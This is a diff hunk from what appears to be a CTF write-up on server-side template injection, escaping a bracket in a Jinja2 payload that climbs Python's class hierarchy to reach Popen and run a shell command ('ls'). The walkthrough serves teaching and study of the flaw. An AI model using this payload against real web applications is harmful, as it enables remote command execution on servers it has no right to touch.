@@ -38,7 +38,7 @@ Now that we have the list, we have to find __*Popen*__ in this hundreds of entri
 
 Our payload now will be something like this:
 
-{{''.__class__.mro()[1].__subclasses__()[414]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.mro()[1].__subclasses__()\[414]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
 
 <img src="images/templated_06.PNG">
 <br />
